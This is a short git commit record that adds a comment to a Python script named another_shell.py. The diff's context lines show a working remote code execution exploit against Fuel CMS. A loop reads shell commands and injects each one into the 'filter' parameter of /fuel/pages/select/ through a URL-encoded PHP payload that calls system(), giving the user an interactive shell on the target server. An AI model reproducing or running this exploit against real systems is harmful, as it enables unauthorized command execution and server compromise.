c7afc23992b59358995a31ab2ad42fb38edb8f94
C9b3rD3vi1 <nicksonwe@gmail.com>
2024-11-09 18:38:35 +0300

    more changes

--- another_shell.py
+++ another_shell.py
@@ -19,6 +19,7 @@ def find_nth_overlapping(haystack, needle, n):
         n -= 1
     return start
 
+# proxy settings
 while 1:
 	xxxx = raw_input('cmd:')
 	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
